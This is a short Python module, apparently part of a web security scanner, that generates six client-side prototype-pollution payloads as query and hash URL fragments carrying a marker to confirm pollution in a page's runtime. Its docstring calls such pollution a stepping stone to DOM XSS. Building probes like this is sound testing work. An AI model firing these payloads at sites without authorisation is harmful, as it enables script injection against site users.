"""Client-side prototype-pollution URL vectors.

A page with a vulnerable client-side gadget (a URL/JSON parser that merges
attacker keys into an object without guarding __proto__/constructor) can have
`Object.prototype` polluted straight from the address bar — often a stepping
stone to DOM XSS. Each vector carries a unique marker so a probe can confirm the
pollution actually landed in the live runtime, not just that the payload was
accepted.
"""
from __future__ import annotations


def vectors(marker: str, value: str = "polluted") -> list:
    """Return [(label, url_fragment)] — fragment is appended to the target URL.
    Covers query- and hash-based __proto__ and constructor.prototype gadgets."""
    return [
        ("query __proto__[k]",              f"?__proto__[{marker}]={value}"),
        ("query __proto__.k",               f"?__proto__.{marker}={value}"),
        ("query constructor.prototype[k]",  f"?constructor[prototype][{marker}]={value}"),
        ("hash __proto__[k]",               f"#__proto__[{marker}]={value}"),
        ("hash constructor.prototype[k]",   f"#constructor[prototype][{marker}]={value}"),
        ("query a&__proto__[k]",            f"?a=1&__proto__[{marker}]={value}"),
    ]
